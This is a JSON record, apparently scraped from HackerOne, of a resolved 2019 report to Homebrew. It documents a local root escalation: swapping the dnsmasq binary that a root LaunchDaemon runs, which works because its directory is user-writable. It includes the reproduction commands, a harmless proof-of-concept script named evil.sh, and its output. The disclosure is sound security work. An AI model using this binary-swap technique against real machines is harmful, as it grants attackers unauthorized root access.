@@ -1,0 +1,117 @@
+{
+  "id": 586251,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC81ODYyNTE=",
+  "url": "https://hackerone.com/reports/586251",
+  "title": "Homebrew installed LaunchDaemons create simple root esclations",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "high",
+  "readable_substate": "Resolved",
+  "created_at": "2019-05-20T19:34:49.683Z",
+  "submitted_at": "2019-05-20T19:34:49.683Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "keeleysam",
+    "url": "/keeleysam",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/188/238/47eb015f939168abe8a35220069d0d36f4f798b0_original.jpeg/c8a1698ff707a5e3e8a91a3484838363845daac68cb82c86d55c9e2d44d67b67"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 19399,
+    "url": "https://hackerone.com/homebrew",
+    "handle": "homebrew",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/019/399/2f26b1d3c096d89ed989900225c128f670ab0ef0_original.png/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/019/399/2f26b1d3c096d89ed989900225c128f670ab0ef0_original.png/3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c"
+    },
+    "permissions": [],
+    "submission_state": "paused",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": false,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "Homebrew",
+      "twitter_handle": "MacHomebrew",
+      "website": "https://brew.sh",
+      "about": "The missing package manager for macOS (and Linux)"
+    }
+  },
+  "has_bounty?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": false,
+  "disclosed_at": "2019-05-24T16:36:52.595Z",
+  "bug_reporter_agreed_on_going_public_at": "2019-05-24T16:36:52.534Z",
+  "team_member_agreed_on_going_public_at": "2019-05-24T16:14:38.648Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "Many programs installed via Homebrew require services to function as expected - most of the time these are LaunchAgents but sometimes they need to run as root via LaunchDaemons to function properly.  While Homebrew attempts to secure the executables run by the LaunchDaemons that it installs, any other program running as the user can easily swap out the program for a simple root escalation.\n\nReproduction steps:\n- In this case, we'll be looking at dnsmasq, but there are many others \n\n1. Install macOS Mojave 10.14.5, create an account and login.\n2. Install homebrew with the instructions on brew.sh.\n3. Run `brew install dnsmasq` - brew will tell the user to run `sudo brew services start dnsmasq`\n4. Run `sudo brew services start dnsmasq` as prompted.\n\n```\nsamuels-Mac:~ samuel$ sudo brew services start dnsmasq\nPassword:\n==> Tapping homebrew/services\nCloning into '/usr/local/Homebrew/Library/Taps/homebrew/homebrew-services'...\nremote: Enumerating objects: 17, done.\nremote: Counting objects: 100% (17/17), done.\nremote: Compressing objects: 100% (14/14), done.\nremote: Total 17 (delta 0), reused 12 (delta 0), pack-reused 0\nUnpacking objects: 100% (17/17), done.\nTapped 1 command (50 files, 62.6KB).\n==> Successfully started `dnsmasq` (label: homebrew.mxcl.dnsmasq)\n```\n5. We'll find a new LaunchDaemon has been created:\n\n```\nsamuels-Mac:~ samuel$ cat /Library/LaunchDaemons/homebrew.mxcl.dnsmasq.plist \n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<!DOCTYPE plist PUBLIC \"-//Apple Computer//DTD PLIST 1.0//EN\" \"http://www.apple.com/DTDs/PropertyList-1.0.dtd\">\n<plist version=\"1.0\">\n  <dict>\n    <key>Label</key>\n    <string>homebrew.mxcl.dnsmasq</string>\n    <key>ProgramArguments</key>\n    <array>\n      <string>/usr/local/opt/dnsmasq/sbin/dnsmasq</string>\n      <string>--keep-in-foreground</string>\n      <string>-C</string>\n      <string>/usr/local/etc/dnsmasq.conf</string>\n    </array>\n    <key>RunAtLoad</key>\n    <true/>\n    <key>KeepAlive</key>\n    <true/>\n  </dict>\n</plist>\n```\n\n6. If we look at the folder `/usr/local/opt/dnsmasq/sbin` we can see that our user doesn't have write permissions on the `/usr/local/opt/dnsmasq/sbin/dnsmasq` program which the LaunchDaemon runs.  \n\n```\nsamuels-Mac:~ samuel$ ls -lah /usr/local/opt/dnsmasq/sbin\ntotal 560\ndrwxr-xr-x   3 samuel  staff    96B Oct 18  2018 .\ndrwxr-xr-x  10 samuel  staff   320B May 20 12:24 ..\n-r-xr-xr-x   1 samuel  staff   279K Oct 18  2018 dnsmasq\nsamuels-Mac:~ samuel$ echo \"\" >> /usr/local/opt/dnsmasq/sbin/dnsmasq \n-bash: /usr/local/opt/dnsmasq/sbin/dnsmasq: Permission denied\n```\n\n7. However, because our user _does_ have write permissions on the `/usr/local/opt/dnsmasq/sbin` directory, an attacker can move `/usr/local/opt/dnsmasq/sbin/dnsmasq` to the side and replace it with a different executable:\n\n```\nsamuels-Mac:~ samuel$ cat /tmp/evil.sh \n#!/bin/sh\n\ntouch /Library/evil\n\nexit 0\n\nsamuels-Mac:~ samuel$ ls -lah /tmp/evil.sh \n-rwxr-xr-x  1 samuel  wheel    40B May 20 12:30 /tmp/evil.sh\nsamuels-Mac:~ samuel$ mv /usr/local/opt/dnsmasq/sbin/dnsmasq /usr/local/opt/dnsmasq/sbin/dnsmasq.bak\nsamuels-Mac:~ samuel$ mv /tmp/evil.sh /usr/local/opt/dnsmasq/sbin/dnsmasq\nsamuels-Mac:~ samuel$ ls -lah /usr/local/opt/dnsmasq/sbin/\ntotal 568\ndrwxr-xr-x   4 samuel  staff   128B May 20 12:31 .\ndrwxr-xr-x  10 samuel  staff   320B May 20 12:24 ..\n-rwxr-xr-x   1 samuel  wheel    40B May 20 12:30 dnsmasq\n-r-xr-xr-x   1 samuel  staff   279K Oct 18  2018 dnsmasq.bak\nsamuels-Mac:~ samuel$ ls -lah /Library/evil\nls: /Library/evil: No such file or directory\n```\n\n8. Once the service relaunches for any reason (reboot of the Mac is most likely), root will execute the malicious executable.\n\n```\nsamuels-Mac:~ samuel$ ls -lah /Library/evil \n-rw-r--r--  1 root  wheel     0B May 20 12:34 /Library/evil\n```\n\n## Impact\n\nAny homebrew formula which prompts users to run `sudo brew services start` opens up this vulnerability.  \n\nOnce this is opened up, any attacker who can run code as the user can easily escalate to root.",
+  "weakness": {
+    "id": 75,
+    "name": "Privilege Escalation"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [],
+  "allow_singular_disclosure_at": "2019-06-23T16:14:38.736Z",
+  "allow_singular_disclosure_after": -217033672.84500393,
+  "singular_disclosure_allowed": true,
+  "vote_count": 8,
+  "voters": [
+    "foobar7",
+    "imran_nisar",
+    "htrgouvea",
+    "mobius07",
+    "hackaccinocraft",
+    "cryptographer",
+    "hi_ztz",
+    "nexxius"
+  ],
+  "severity": {
+    "rating": "high",
+    "author_type": "User"
+  },
+  "structured_scope": null,
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
